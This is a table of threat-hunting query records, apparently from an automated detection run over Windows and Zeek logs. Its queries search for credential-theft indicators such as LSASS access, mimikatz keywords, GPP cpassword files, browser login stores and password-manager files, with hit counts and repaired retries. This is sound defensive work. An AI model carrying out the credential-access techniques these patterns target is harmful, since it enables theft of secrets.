| q-e8229505ea | check C192 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"5145\" AND (TO_LOWER(win.RelativeTargetName) LIKE \"*.key\" OR TO_LOWER(win.RelativeTargetName) LIKE \"*.pem\" OR TO_LOWER(win.RelativeTargetName) LIKE \"*.pfx\" OR TO_… | 0 |  |
| q-a1aa7c38ba | check C193 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*.key\" OR TO_LOWER(win.ObjectName) LIKE \"*.pem\" OR TO_LOWER(win.ObjectName) LIKE \"*.pfx\" OR TO_LOWE… | 0 |  |
| q-454b5106df | check C194 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*.pem*\" OR TO_LOWER(COALESCE(powershell.script_block_text, … | ERROR |  |
| q-341197bf78 | check C194 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*.pem*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*.pfx*\" OR TO_LOWER(COAL… | 2 |  |
| q-1f3929a6ec | check C195 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*.pem*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*.pfx*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*… | 0 |  |
| q-5528689df0 | check C196 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*groups.xml*\" OR TO_LOWER(COALESCE(powershell.script_block_… | ERROR |  |
| q-3210002c0e | check C196 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*groups.xml*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*sysvol*\" OR TO_LO… | 32 |  |
| q-565070bbc3 | check C197 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*sysvol*\" OR TO_LOWER(process.command_line) LIKE \"*groups.xml*\" OR TO_LOWER(process.command_line) LIKE \"*cpassword*\" O… | 0 |  |
| q-80298c7eba | check C198 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*groups.xml*\" OR TO_LOWER(file.path) LIKE \"*sysvol*\" OR TO_LOWER(file.path) LIKE \"*gpprefdecrypt*\" OR TO_LOWER(file.path) LIKE \… | 22 |  |
| q-959b63d44c | check C199 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"5145\" AND (TO_LOWER(win.RelativeTargetName) LIKE \"*groups.xml*\" OR TO_LOWER(win.ShareName) LIKE \"*sysvol*\" OR TO_LOWER(win.ShareName) LIKE \"*netlogon*\") \| KEEP … | 56 |  |
| q-fea68f1ca6 | check C200 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*groups.xml*\" OR TO_LOWER(win.ObjectName) LIKE \"*sysvol*\" OR TO_LOWER(win.ObjectName) LIKE \"*gpp*\")… | 0 |  |
| q-92ad9f8452 | check C201 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*sysvol*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*groups.xml*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) … | 0 |  |
| q-465fda98a1 | check C202 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" OR TO_LOWER(win.SourceImage) LIKE \"*lsass.exe\") \| KEEP @timestamp, host.name, user.name, win.SourceImage, win.T… | 500 |  |
| q-680fa9e3a5 | check C203 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass.exe", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-d1c6fbb3bc | check C204 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*sekurlsa*\" OR TO_LOWER(process.command_line) LIKE \"*lsadump*\" OR TO_LOWER(process.command_line) LIKE \"*mimikatz*\" OR … | 0 |  |
| q-d80a2b7439 | check C205 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4670\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*\\\\protect\\\\*\" OR TO_LOWER(win.ObjectName) LIKE \"*credential*\" OR TO_LOWER(win.ObjectNam… | ERROR |  |
| q-e61dafe131 | check C205 (repaired) | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4670\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*protect*\" OR TO_LOWER(win.ObjectName) LIKE \"*credential*\" OR TO_LOWER(win.ObjectName) LIKE … | 19 |  |
| q-a113e4cdec | check C206 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND (TO_LOWER(process.command_line) LIKE \"*sekurlsa*\" OR TO_LOWER(process.command_line) LIKE \"*lsadump*\" OR TO_LOWER(process.command_line) LIKE \"*mimikatz*\… | 0 |  |
| q-85a0d63bb8 | check C207 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*sekurlsa*\" OR TO_LOWER(COALESCE(powershell.script_block_te… | ERROR |  |
| q-dac5617d12 | check C207 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*sekurlsa*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*lsadump*\" OR TO_LOW… | 5 |  |
| q-2c6ac2333c | check C208 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*lsass*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*credential*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) L… | 2 |  |
| q-aabe782ce5 | check C209 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*login data*\" OR TO_LOWER(process.command_line) LIKE \"*\\\\google\\\\chrome\\\\user data*\" OR TO_LOWER(process.command_l… | ERROR |  |
| q-096bb7742f | check C209 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*login data*\" OR TO_LOWER(process.command_line) LIKE \"*google*chrome*user data*\" OR TO_LOWER(process.command_line) LIKE … | 0 |  |
| q-38edc91bd9 | check C210 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*login data*\" OR TO_LOWER(file.path) LIKE \"*logins.json*\" OR TO_LOWER(file.path) LIKE \"*key3.db*\" OR TO_LOWER(file.path) LIKE \"… | ERROR |  |
| q-d2d93cc56d | check C210 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*login data*\" OR TO_LOWER(file.path) LIKE \"*logins.json*\" OR TO_LOWER(file.path) LIKE \"*key3.db*\" OR TO_LOWER(file.path) LIKE \"… | 0 |  |
| q-361cf40484 | check C211 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (TO_LOWER(win.TargetImage) LIKE \"*chrome.exe\" OR TO_LOWER(win.TargetImage) LIKE \"*firefox.exe\" OR TO_LOWER(win.TargetImage) LIKE \"*msedge.exe\" OR TO_LOWER(… | 0 |  |
| q-e305890e44 | check C212 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*login data*\" OR TO_LOWER(win.ObjectName) LIKE \"*logins.json*\" OR TO_LOWER(win.ObjectName) LIKE \"*ke… | ERROR |  |
| q-8a8d187139 | check C212 (repaired) | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*login data*\" OR TO_LOWER(win.ObjectName) LIKE \"*logins.json*\" OR TO_LOWER(win.ObjectName) LIKE \"*ke… | 0 |  |
| q-e36dfc31d4 | check C213 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*login data*\" OR TO_LOWER(COALESCE(powershell.script_block_… | ERROR |  |
| q-06c97ff21f | check C213 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*login data*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*logins.json*\" OR … | 0 |  |
| q-7ece5cbe1b | check C214 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*login data*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*logins.json*\" OR TO_LOWER(COALESCE(message, win.Message, \"… | 0 |  |
| q-5ee15a151f | check C215 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-7349d5e71a | check C216 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-295b032542 | check C217 | search | {"dataset": "windows.sysmon", "query": "event.code:15 AND file.path:*Credentials*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 0 |  |
| q-156af609c4 | check C218 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*vault* OR process.command_line:*Credential* OR process.command_line:*cmdkey*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "eve… | 0 |  |
| q-b7efa02025 | check C219 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Credential* OR powershell.script_block_text:*vault* OR powershell.script_block_text:*cmdkey*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.na… | 0 |  |
| q-802129bf35 | check C220 | search | {"dataset": "windows.other", "query": "message:*Credential* OR message:*vault*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line"… | 2 |  |
| q-62c98388d9 | check C221 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*keepass* OR process.executable:*1password* OR process.executable:*bitwarden* OR process.executable:*lastpass* OR process.executable:*dashlane*)", "time_from": null, "time_to": null, … | 0 |  |
| q-2ca079878d | check C222 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*keepass* OR file.path:*1password* OR file.path:*bitwarden* OR file.path:*lastpass*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.datase… | 0 |  |
| q-ca83cb51a2 | check C223 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND (win.TargetImage:*keepass* OR win.TargetImage:*1password* OR win.TargetImage:*bitwarden*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "e… | 0 |  |
| q-07f7629be6 | check C224 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*keepass* OR process.command_line:*1password* OR process.command_line:*bitwarden* OR process.command_line:*kdbx*)", "time_from": null, "time_to": null, "fields": ["@timestamp",… | 0 |  |
| q-3d132e9e7b | check C225 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*keepass* OR powershell.script_block_text:*kdbx* OR powershell.script_block_text:*1password* OR powershell.script_block_text:*bitwarden*)", "time_from": null, "time_t… | 0 |  |
| q-f7ccfa15f8 | check C226 | search | {"dataset": "windows.other", "query": "message:*keepass* OR message:*1password* OR message:*bitwarden* OR message:*kdbx*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-e552eb6fa0 | check C227 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-0fb524404b | check C228 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-40a6c79b3d | check C229 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll* OR win.ImageLoaded:*sam* OR win.ImageLoaded:*msv1_0*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "… | 77 | F39 |
| q-42ca0fe928 | check C230 | search | {"dataset": "windows.security", "query": "event.code:4657 AND (win.ObjectName:*lsass* OR win.ObjectName:*cryptdll* OR win.ObjectName:*msv1_0* OR win.ObjectName:*sam*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", … | 0 |  |
| q-d470868050 | check C231 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*lsass* OR process.command_line:*cryptdll* OR process.command_line:*msv1_0*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event… | 0 |  |
| q-73d20489a1 | check C232 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*lsass* OR powershell.script_block_text:*cryptdll* OR powershell.script_block_text:*msv1_0* OR powershell.script_block_text:*SecurityPackages*)", "time_from": null, "… | 0 |  |
| q-fcd36c3508 | check C233 | search | {"dataset": "windows.other", "query": "message:*lsass* OR message:*cryptdll* OR message:*msv1_0*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pro… | 0 |  |
| q-a379b69b85 | check C234 | search | {"dataset": "windows.security", "query": "event.code:4624 AND win.LogonType:3", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line",… | 218 | F38 |
| q-40a189f082 | check C235 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-7708efd6a2 | check C236 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-cd13ddf922 | check C237 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-e5defbc28b | check C238 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.e… | 33 |  |
| q-00806e0c23 | check C239 | search | {"dataset": "windows.other", "query": "message:*lsass* OR message:*cryptdll*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-ed474136ad | check C240 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*lsass* OR powershell.script_block_text:*cryptdll* OR powershell.script_block_text:*Skeleton* OR powershell.script_block_text:*DCShadow*)", "time_from": null, "time_t… | 0 |  |
| q-0ec6b6bf72 | check C241 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*System32* AND (file.path:*.dll))", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable"… | 0 |  |
| q-e3e929adbe | check C242 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.e… | 33 |  |
| q-f0e517444e | check C243 | search | {"dataset": "windows.security", "query": "event.code:4657 AND (win.ObjectName:*Notification\\ Packages* OR win.ObjectName:*Password* OR win.ObjectName:*lsass*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.… | 0 |  |
| q-90200f1a69 | check C244 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*Notification* OR process.command_line:*PasswordFilter*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.co… | 0 |  |
| q-312c0a44e5 | check C245 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Notification* OR powershell.script_block_text:*PasswordFilter* OR powershell.script_block_text:*lsass*)", "time_from": null, "time_to": null, "fields": ["@timestamp"… | 0 |  |
| q-e4841875a5 | check C246 | search | {"dataset": "windows.other", "query": "message:*Notification* OR message:*PasswordFilter* OR message:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.execu… | 10 |  |
| q-d99fc7ec72 | check C247 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*AllowReversiblePasswordEncryption* OR powershell.script_block_text:*ReversibleEncryption* OR powershell.script_block_text:*Set-ADUser*)", "time_from": null, "time_to… | 0 |  |
| q-d3049ded19 | check C248 | search | {"dataset": "windows.powershell", "query": "event.code:4103 AND (message:*AllowReversiblePasswordEncryption* OR message:*ReversibleEncryption*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event… | 0 |  |
| q-71f9ab1a5f | check C249 | search | {"dataset": "windows.security", "query": "event.code:4739", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-c7e23076e6 | check C250 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*Reversible* OR process.command_line:*Set-ADUser* OR process.command_line:*dsmod*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", … | 0 |  |
| q-0416b9791a | check C251 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*Reversible* OR process.command_line:*Set-ADUser* OR process.command_line:*dsmod*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "even… | 0 |  |
| q-3b7157cfef | check C252 | search | {"dataset": "windows.other", "query": "message:*Reversible* OR message:*AllowReversiblePasswordEncryption*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executa… | 0 |  |
| q-fa4917c95b | check C253 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*set-aduser*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(powershell.script_block_text)… | ERROR |  |
| q-384c78b518 | check C253 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*set-aduser*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*strongauthenticati… | 1 |  |
| q-0b7a7c5182 | check C254 | count | {"dataset": "windows.security", "query": "event.code:4739", "time_from": null, "time_to": null} | 0 |  |
| q-fe354faf74 | check C255 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:5136 OR event.code:4739", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-1d820d0c55 | check C256 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*set-aduser*\" OR TO_LOWER(process.command_line) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(process.command_line) LI… | 0 |  |
| q-cca33d8ba1 | check C257 | search | {"dataset": "windows.other", "query": "event.code:4739 OR event.code:5136 OR event.code:4738", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-de8ccf9355 | check C258 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-e17d0cfdc2 | check C259 | aggregate | {"dataset": "windows.security", "field": "win.AuthenticationPackageName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-4f73905296 | check C260 | count | {"dataset": "windows.security", "query": "event.code:5136", "time_from": null, "time_to": null} | 0 |  |
| q-c8af4a9527 | check C261 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 20259 |  |
| q-85317b2703 | check C262 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*connect-msolservice*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*connect-azuread*\" OR TO_LOWER(powershell.script_block_text) L… | ERROR |  |
| q-37f035609c | check C262 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*connect-msolservice*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*connect-azuread*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*new-azuread*\" OR TO… | 0 |  |
| q-77c1ba2d65 | check C263 | search | {"dataset": "windows.other", "query": "event.code:5136 OR event.code:4739 OR event.code:4738", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-8ed0021e2d | check C264 | count | {"dataset": "windows.security", "query": "event.code:4657", "time_from": null, "time_to": null} | 36 |  |
| q-9df56d58c5 | check C265 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4657\" AND (TO_LOWER(win.ObjectName) LIKE \"*networkprovider*\" OR TO_LOWER(win.ObjectName) LIKE \"*credential*\" OR TO_LOWER(win.ObjectName) LIKE \"*winlogon*\") \| KE… | 0 |  |
| q-91a6d13b13 | check C266 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*networkprovider*\" OR TO_LOWER(file.path) LIKE \"*system32*credential*\" OR TO_LOWER(file.path) LIKE \"*winlogon*\") \| KEEP @timest… | 1 |  |
| q-50ea2b6d4a | check C267 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 39283 |  |
| q-1483aa584a | check C268 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 20259 |  |
| q-57f4b30ff7 | check C269 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*networkprovider*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*new-itemproperty*\" OR TO_LOWER(powershell.script_block_text) LIKE… | ERROR |  |
| q-0e632f3b3d | check C269 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*networkprovider*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*new-itemproperty*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*reg add*\" \| KEEP @tim… | 0 |  |
| q-57c0d50a5f | check C270 | search | {"dataset": "windows.other", "query": "event.code:4657 OR event.code:11 OR event.code:7", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 4 |  |
| q-7c7780760a | check C271 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-58847585ab | check C272 | aggregate | {"dataset": "windows.security", "field": "win.ProcessName", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-da23d1d752 | check C273 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1229 |  |
| q-3983f86daa | check C274 | aggregate | {"dataset": "windows.sysmon", "field": "win.QueryName", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-7b05da0537 | check C275 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*responder*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*mitm*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*arpspoof*\" OR… | ERROR |  |
| q-ab46640d26 | check C275 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*mitm*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*arpspoof*\" OR TO_LOWER(win.ScriptBlockTe… | 0 |  |
| q-8ef45cbe4a | check C276 | search | {"dataset": "windows.other", "query": "event.code:4663 OR event.code:4670 OR event.code:4656 OR event.code:3 OR event.code:22", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name… | 2 |  |
| q-cc58f0d66e | check C277 | aggregate | {"dataset": "zeek", "field": "zeek.conn_state", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-7117945a15 | check C278 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-0ee593fb18 | check C279 | count | {"dataset": "windows.security", "query": "event.code:4697", "time_from": null, "time_to": null} | 23 |  |
| q-f0524e5388 | check C280 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4657\" AND TO_LOWER(win.ObjectName) LIKE \"*dnsclient*\" \| KEEP @timestamp, host.name, user.name, win.ObjectName, win.NewValue, _id, _index"} | 0 |  |
| q-71b0a4cf1e | check C281 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1229 |  |
| q-e01ace9a5e | check C282 | aggregate | {"dataset": "windows.sysmon", "field": "win.QueryName", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-a0ca97fd6b | check C283 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*llmnr*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*nbt-ns*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*responder*\" OR … | ERROR |  |
| q-45a1d1129f | check C283 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*llmnr*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*nbt-ns*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockTex… | 0 |  |
